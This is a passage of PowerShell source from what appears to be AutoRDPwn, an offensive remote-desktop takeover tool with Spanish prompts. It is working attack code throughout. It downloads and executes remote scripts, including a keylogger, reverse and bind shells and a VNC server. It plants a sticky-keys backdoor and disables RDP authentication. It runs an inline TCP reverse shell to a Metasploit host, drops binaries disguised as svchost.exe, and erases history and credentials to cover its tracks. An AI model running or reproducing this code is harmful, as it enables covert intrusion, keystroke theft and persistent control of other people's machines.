    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
    Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "NamedPipeStream" } 2>&1> $null }}

    if($vncserver){ $base64 = if ($local){ Get-Content .\Resources\Scripts\Invoke-VNCServer.ps1 } else {
    (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')}
    invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
    Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
        
    if ($sticky){ invoke-command -session $RDP[0] -scriptblock {
    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name LogonTimeout -Value 3600 -PropertyType DWord -Force 2>&1> $null }}

        if($version -Like '*Server*') { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
        Write-Host ; Write-Host "[+] $using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } ; $Host.UI.RawUI.ForegroundColor = 'Green'
        $shadowactive = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer -ErrorAction SilentlyContinue).SessionId | Sort-Object | Select-Object -Last 1 }
        do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; if($shadowactive -and !$shadow){ Write-Host "[$shadowactive]" -NoNewLine -ForegroundColor DarkGray }
        $shadowinput = $Host.UI.ReadLine() ; if($shadowinput){ $shadow = $shadowinput } elseif($shadowactive){ $shadow = $shadowactive }
        if(!$shadow){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
        elseif($shadow -notmatch '^[0-9]+$') { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 ; $shadow = $null }} until ($shadow)}

        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $PlainTextPassword }}
        if(!$nogui){ if($vncserver -and !(Test-Path .\VNCViewer.exe)){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}}
        $ViewerProcess = Start-RemoteViewer -computer $computer -user $user -PlainTextPassword $PlainTextPassword -control $control -shadow $shadow -sticky $sticky -vncserver $vncserver }}

        else { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$vncserver -and (!$control -or $nogui)){
        if($local){ Import-Module .\Resources\Scripts\Invoke-RDPwrap.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')}
        invoke-command -session $RDP[0] -scriptblock { Set-Content -Path Setup.msi -Value $using:RDPWrap -Encoding Byte 
        msiexec /i "Setup.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null ; del .\Setup.msi
        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
        attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; Start-Sleep -milliseconds 2500 ; rm .\Setup.msi 2>&1> $null }}

        if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer -ErrorAction SilentlyContinue).SessionId | Sort-Object | Select-Object -Last 1 } ; Write-Host ; Write-Host "[+] $txt35" -ForegroundColor Blue ; Start-Sleep -milliseconds 300 }
        if(!$shadow -and !$sticky){ $shadow = 1 }
        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $PlainTextPassword }}
        if(!$nogui){ if($vncserver -and !(Test-Path .\VNCViewer.exe)){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}}
        $ViewerProcess = Start-RemoteViewer -computer $computer -user $user -PlainTextPassword $PlainTextPassword -control $control -shadow $shadow -sticky $sticky -vncserver $vncserver }}

$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host "[+] $txt66" ; Write-Host ; Write-Host "[i] Credenciales primero: cmdkey /add:$remotehost /user:USUARIO /pass:CLAVE" ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /f" ; Write-Host
if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -noprofile -windowstyle hidden $using:Pwn5 }}}
else { Write-Host "[i] $txt38" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }

if ($hash){ invoke-command -session $RDP[0] -scriptblock {
$script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}

if ($webserver){ if($local){ Import-Module .\Resources\Scripts\Start-WebServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Start-WebServer.ps1')}
invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
(New-Object -Com Shell.Application).Open("http://$computer`:8080") ; invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}

if ($metasploit){ Write-Host ; Write-Host "[+] Loading Metasploit Reverse Shell.." -ForegroundColor Blue ; Write-Host ; Start-Sleep -milliseconds 2000
Write-Host "[!] Waiting until Metasploit Reverse Shell is working.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
$metashell = $client = New-Object System.Net.Sockets.TCPClient("$metahost",$metaport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = 
(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 2000 }}

if ($netcat -in 'local'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
Invoke-PowerShellTcp -Bind -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
 
if ($netcat -in 'remote'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1 ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500
Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}

if ($getkeys){ if($local){ Import-Module .\Resources\Scripts\Invoke-Keylogger.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Keylogger.ps1')}
invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
(Get-Process | ? {$_.Path -like "*Local\Temp\svchost.exe"}).kill() ; Remove-Item $env:LOCALAPPDATA\config.dat ; cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'Ctrl+C' to stop              " -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}

if ($smbshell){ Write-Host ; if($local){ Import-Module .\Resources\Scripts\Invoke-PipeShell.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')}
Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pipe "NamedPipeStream" -timeout 120 }

if ($revshell){ Write-Host ; Write-Host "[+] Downloading HTTP-RevShell Server.." -ForegroundColor Blue
if($local){ Import-Module .\Resources\Scripts\Invoke-RevShellServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RevShellServer.ps1')}
if($local){ Import-Module .\Resources\Scripts\Invoke-WebRev.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-WebRev.ps1')}
invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { $webrevscript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$using:webrev64")) ; Set-Content -Value $webrevscript -Path Invoke-WebRev.ps1
Import-Module .\Invoke-WebRev.ps1 ; Invoke-WebRev -ip $using:webrevip -port $using:webrevport } 2>&1> $null }
try { Clear-Host ; .\server.exe $webrevip $webrevport ; del .\server.exe } finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; del .\server.exe }}

if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
else { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; if(!$option){ Get-AttackHint -Computer $computer } ; Start-Sleep -milliseconds 3000 } if($tsfail) { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}

if ($noclean -or $nogui) { $null } else { Write-Host ; Write-Host "[!] $txt75" -ForegroundColor Red ; Start-Sleep -milliseconds 1000
if ($ViewerProcess) { $null = $ViewerProcess.WaitForExit() }
    do { Write-Host
        Write-Host "  [" -NoNewLine -ForegroundColor Gray ; Write-Host "R" -NoNewLine -ForegroundColor Green ; Write-Host "] - Reconectar a la ultima sesion" -ForegroundColor Gray
        Write-Host "  [" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Volver al menu principal" -ForegroundColor Gray
        Write-Host "  [" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Salir (limpieza final)" -ForegroundColor Gray
        & $question ; Write-Host "Selecciona una opcion [R/M/X]: " -NoNewLine -ForegroundColor Gray ; $postaction = $Host.UI.ReadLine() ; if(!$postaction){ $postaction = 'X' }
        if($postaction -in 'R','r','reconectar','reconnect') { Write-Host ; $ViewerProcess = Start-RemoteViewer -computer $computer -user $user -PlainTextPassword $PlainTextPassword -control $control -shadow $shadow -sticky $sticky -vncserver $vncserver
        if($ViewerProcess){ $null = $ViewerProcess.WaitForExit() }}
        if($postaction -in 'M','m','menu') { Write-Host ; Write-Host "[i] Volviendo al menu principal (sin reiniciar AutoRDPwn).." -ForegroundColor Green ; Start-Sleep -milliseconds 500
        $backtomenu = 'true' ; $postaction = 'X' }
        if($postaction -notin 'R','r','reconectar','reconnect','M','m','menu','X','x','salir','exit') { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ($postaction -in 'X','x','salir','exit')
if($backtomenu -ne 'true') {
if ($attack) { Start-Sleep -milliseconds 1000 ; Write-Host ; Write-Host "[+] $txt77" -ForegroundColor Blue ; Start-Sleep -milliseconds 1500 }
if (!$local) { $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript } ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null ; cmdkey /del $computer 2>&1> $null
Write-Host ; Write-Host "[i] $txt76" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }}
if($backtomenu -eq 'true'){ Write-Host "[i] De vuelta al menu principal.." -ForegroundColor Green ; Start-Sleep -milliseconds 500
$input = $null ; $postaction = $null ; $backtomenu = $null ; $attack = $null ; $hash = $null ; $control = $null ; $shadow = $null ; $sticky = $null ; $vncserver = $null ; $smbshell = $null ; $console = $null ; $revshell = $null ; $netcat = $null ; $getkeys = $null ; $webserver = $null ; $metasploit = $null ; $remoteforward = $null ; $tsfail = $null ; $ViewerProcess = $null ; $credential = $null ; $password = $null ; $PlainTextPassword = $null
if($RDP){ $RDP | Remove-PSSession -ErrorAction SilentlyContinue 2>&1> $null ; $RDP = $null } ; $reload = 'true' }
else { $reload = 'false' }
} while ($reload -eq 'true')
